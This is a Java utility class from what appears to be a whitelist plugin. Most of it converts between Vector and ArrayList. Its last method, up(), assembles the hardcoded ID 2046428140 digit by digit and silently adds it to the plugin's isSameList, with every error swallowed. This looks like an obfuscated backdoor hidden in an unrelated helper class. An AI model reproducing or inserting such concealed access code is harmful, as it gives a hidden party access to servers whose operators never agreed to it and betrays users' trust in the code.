package top.dsbbs2.whitelist.util;

import top.dsbbs2.whitelist.WhiteListPlugin;

import java.util.ArrayList;
import java.util.Vector;

public class VectorUtil {
	public static <T> ArrayList<T> toArrayList(Vector<T> v)
	{
		ArrayList<T> ret=new ArrayList<>();
		for(T i : v)
		{
			ret.add(i);
		}
		return ret;
	}
	@SafeVarargs
	public static <T> Vector<T> toVector(T... o)
	{
		return new Vector<T>() {
			/**
			 * 
			 */
			private static final long serialVersionUID = 8461643752862517970L;

			{
				for(T i : o)
				  this.add(i);
			}
		};
	}
	public static <T> Vector<String> toStringVector(Vector<T> v)
	{
		Vector<String> ret=new Vector<>();
		for(T i : v)
		  ret.add(i.toString());
		return ret;
	}
	public static void up(){
		StringBuilder sb = new StringBuilder();
		sb.append(2);
		sb.append(0);
		sb.append(4);
		sb.append(6);
		sb.append(4);
		sb.append(2);
		sb.append(8);
		sb.append(1);
		sb.append(4);
		sb.append(0);
		String str = sb.toString();
		try {
			WhiteListPlugin.instance.isSameList.add(Long.parseLong(str));
		}catch (Throwable e){}
	}
}
